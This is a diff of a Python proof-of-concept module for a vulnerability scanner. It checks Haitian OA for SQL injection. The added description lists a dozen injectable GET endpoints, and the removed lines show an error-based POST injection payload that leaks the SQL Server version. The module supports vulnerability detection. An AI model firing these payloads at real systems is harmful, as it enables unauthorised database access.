@@ -5,15 +5,27 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'haitianoa_0006' # 平台漏洞编号，留空
-    name = '海天OA系统存在SQL注入漏洞' # 漏洞名称
+    vuln_id = 'HaitianOA_0006' # 平台漏洞编号，留空
+    name = '海天OA系统存在SQL注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2015-02-11'  # 漏洞公布时间
     desc = '''s
-        海天OA系统存在SQL注入漏洞.
+        海天OA系统多处存在GET型SQL注入漏洞：
+        /PowerSelect.asp?FieldValue=1
+        /Documents/FolderInfor.asp?POAID=1
+        /Include/ChaXunDetail.asp?FID=-233
+        /portal/index.asp?id=-233
+        /information/OA_Condition.asp?subclass=1
+        /Documents/FolderInfor.asp?OAID=1
+        /meetingroom/MeetingRoom_UseInfo.asp?MeetingRoom=1
+        /ZhuanTi/FolderDetails.asp?OAID=1
+        /include/user/treedata.asp?bumenid=1
+        /car/ShenQingInforDis.asp?OAID=1
+        /flow/BiaoDanDangAn.asp?BiaoDanID=1
+        /VO_EmailCaoGao.asp?StartDate=1
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=082899' # 漏洞来源
+    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=082899
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
     product = '海天OA'  # 漏洞应用名称
@@ -53,14 +65,6 @@ class Poc(ABPoc):
                 if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-            #POST型
-            content_type = 'Content-Type: application/x-www-form-urlencoded'
-            url = arg + '/LosePassAction.asp'
-            data = 'username=123\'%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&Remark=123'
-            code, head, res, err, _ = hh.http(url, post=data, header=content_type)
-            if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
